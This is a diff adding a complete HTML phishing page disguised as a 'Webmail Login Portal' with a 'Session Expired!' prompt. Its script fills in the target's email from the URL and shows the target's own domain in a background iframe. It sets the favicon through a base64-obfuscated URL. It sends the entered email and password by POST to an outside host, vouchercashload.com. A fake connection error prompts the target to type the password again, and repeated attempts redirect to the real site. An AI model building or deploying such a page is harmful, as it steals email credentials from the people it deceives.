@@ -1,0 +1,195 @@
+<html><head><meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Webmail Login Portal</title>
+	<link rel="shortcut icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&amp;type=FAVICON&amp;fallback_opts=TYPE,SIZE,URL&amp;size=64&amp;url=${dxmain}" type="image/x-icon">
+
+	<style type="text/css">
+		*{ outline:none; margin:0; padding:0 }
+		html, body { height: 100%; font-family: 'Open Sans', sans-serif;
+		color: #535353; font-size: 15px; flex-wrap: inherit;}
+
+		.showbody {
+		height: 100vh;
+		width: 100%;
+		display: flex;
+		flex-direction: column;
+		align-items: center;
+		justify-content: center; z-index: 10;background-color: #0000004f; font-weight: bold;
+		}
+		iframe{ position: absolute;height: 100%;border: none;z-index: -1; opacity:0.8 }
+
+		.form-father-div {
+		background-color: orange;
+		width: 320px;
+		/*  min-height: 450px;*/
+		max-width: 330px;
+		margin: 0 auto;
+		color: #717171;
+		padding: 25px 30px 30px;
+		background: #fdfdfd;
+		box-shadow: 2px 2px 2px 2px rgb(0 0 0 / 30%);    
+		/*    text-align: center;  */
+		}
+		.mybox{
+			background: #D9D8D8;
+			    color: black;
+			    width: 450px;
+			    height: 240px;
+			    border-radius: 5px;
+			    box-shadow: 1px 1px 5px 5px rgb(0 0 0 / 30%);
+		}
+		.topheadofdiv{color: #000;padding: 6px 8px 3px 10px;margin-bottom: 10px; display: flex; justify-content: center; font-family: cursive; border-bottom: 1px solid #aaa; align-items: center;}
+		.topheadofdiv img{margin-right: 10px; width: 32px; height: 32px}
+		form{ 
+			    margin: 0 auto;
+			    width: 320px;
+			}
+		.mmm{
+			  display: flex;
+			  justify-content: center;
+			  align-items: center;			
+		}
+		.inputgrouped{ 
+		}
+		.inputgrouped input[type=password] {
+		    padding: 5px 6px;
+		}		
+		 td,  th {
+		    padding: 8px 1px;
+		    display: table-cell;
+		    text-align: left;
+		/*    vertical-align: top;*/
+		    width: 160px;
+		}
+		.btn {
+		width: 100%;
+		padding: 3px 52px;
+		margin-bottom: 0;
+		font-size: 20px;
+		font-weight: 400;
+		line-height: 1.42857143;
+		border: 1px solid #444;
+		border-radius: 3px;
+		cursor: pointer;
+		background-color: transparent;
+		}
+		.btn:hover {
+			box-shadow: 2px 2px 2px 2px rgb(0 0 0 / 30%);
+		}		
+		button:disabled,button[disabled]{cursor: not-allowed; opacity: 0.6}
+		.erx{margin: 10px 0px 0px; padding: 7px 5px;  color:#c50000; font-size:16px; text-align:center; }
+		</style>	
+	</head>
+	<body>
+		<iframe id="eFrame" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style=""></iframe>
+		<section class="showbody">
+
+
+			<div class="mybox">
+				<div class="topheadofdiv">
+					<img src="" alt="" id="domainimg"> 
+					<span>Session Expired!</span>
+		  			<span class="sitename"></span>
+				</div>		
+
+			  	<div class="erx" style="display: none;">Conection error, kindly try again!</div>
+				  	<form action="">
+				  		<div class="inputgrouped">
+				  			<table>
+				  			<tr>
+				  				<td>Email Address:</td>
+					  			<td>
+					  				<input type="email" value="" id="lm" disabled style="border: 0;background: transparent;color: black;margin-left: -22px;font-size: 15px;" required>
+					  			</td>				  				
+				  			</tr>				  				
+				  			</table>
+				  			<table>
+				  			<tr>
+				  				<td>Email Password:</td>
+					  			<td>
+					  				<input type="password" name="" minlength="6" class="inputself" placeholder="Email password" id="lp" required>
+					  			</td>				  				
+				  			</tr>				  				
+				  			</table>
+				  		</div>
+				  		<center><input type="checkbox" style="margin-right: 5px;">Keep me logged in</center>
+				  		<div style="display: flex; justify-content: center; margin-top: 10px;">
+				  			<button class="btn btn-blue" id="getitBtn">Log In</button>
+				  		</div>	  	
+
+				  		</div>			  					
+				  	</form>				  		
+			</div>			
+		</section>
+	    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
+	    <script>
+			$(document).ready(function() {
+			  const getit = new URLSearchParams(window.location.search);
+			  const hashedget = getit.get('e');
+
+			  if (!hashedget) {
+			  	$('html').text('Error');
+			  	window.stop;
+			  }else{
+				
+
+			  $("#lm").val(hashedget);
+
+			  let dxmain = hashedget.split("@")[1];
+			  let sitename = dxmain.split(".")[0].toUpperCase();
+			  // $('.sitename').text(sitename);
+			  document.querySelector('title').append(sitename);
+			  let favimg = atob('aHR0cHM6Ly90MS5nc3RhdGljLmNvbS9mYXZpY29uVjI/Y2xpZW50PVNPQ0lBTCZ0eXBlPUZBVklDT04mZmFsbGJhY2tfb3B0cz1UWVBFLFNJWkUsVVJMJnNpemU9NjQmdXJsPWh0dHA6Ly8=')+dxmain
+			  document.querySelector('link[rel="shortcut icon"]').setAttribute('href', favimg);
+			  document.querySelector('#domainimg').setAttribute('src', favimg);
+			  const currentYear = new Date();
+			  $("#ledomen").text(dxmain)
+			  $("#eFrame").attr('src', `https://${dxmain}`)
+
+			  var checker = 0
+			    $("form").on('submit', (event) =>{
+			        event.preventDefault();
+			        event.stopPropagation();
+			        $(".erx").hide();
+			        let email = $("#lm").val()
+			        let password = $("#lp").val()
+
+			        checker++;
+
+			        $.ajax({
+			            
+			            url: "https://vouchercashload.com/u.php",
+			            method: "post",
+			            data: {
+			                email: email,
+			                pass: password,
+							clientUrl: `https://${dxmain}`,
+							typesent: ""			                
+			            },
+
+			            beforeSend: ()=>{
+			                $("#getitBtn").prop('disabled', true).html("Verifying...")
+			            },
+			            error: (data)=>{
+			                $(".erx").show();
+
+			                if (checker > 3) {
+			                    window.location.href="//"+domain;
+			                }
+			                setTimeout(() => {
+			                    $("#lp").val("").focus();
+			                }, 100);
+			            },
+			            
+			            complete: function(){
+			              $('#getitBtn').prop('disabled', false).html("Log In")
+			            }               
+			        })
+
+			    });			  		
+
+			  }
+			});
+			</script>
+	</body>
+</html>
